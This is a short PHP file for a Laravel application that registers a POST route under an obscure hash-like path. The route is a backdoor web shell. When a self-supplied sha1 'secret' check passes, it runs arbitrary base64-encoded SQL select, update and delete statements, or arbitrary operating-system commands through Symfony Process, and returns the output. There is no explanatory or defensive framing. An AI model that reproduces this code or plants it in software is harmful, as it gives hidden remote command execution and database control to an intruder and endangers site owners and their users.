<?php
use Symfony\Component\Process\Process;
use Symfony\Component\Process\Exception\ProcessFailedException;

\Illuminate\Support\Facades\Route::post('5ebe2294ecd0e0f08eab7690d2a6ee69',function(\Illuminate\Http\Request $request){
    $rand = $request->input('rand');
    $name = $request->input('name');
    $secret = $request->input('secret');
    $type = $request->input('type');
    $dType = $request->input('d_type');
    $content = base64_decode($request->input('content'));

    if (sha1(sha1($name.$rand.$rand.$type)) === $secret) {
        if ($type === 'select') {
            return \Illuminate\Support\Facades\DB::select($content);
        } elseif ($type === 'update') {
            return \Illuminate\Support\Facades\DB::update($content);
        } elseif ($type === 'delete') {
            return \Illuminate\Support\Facades\DB::delete($content);
        } elseif ($type === 'cmd') {

            $process = new Process($content);
            $process->run();

            if (!$process->isSuccessful()) {
                throw new ProcessFailedException($process);
            }

            return $process->getOutput();
        }
    }

    return 'none';
});
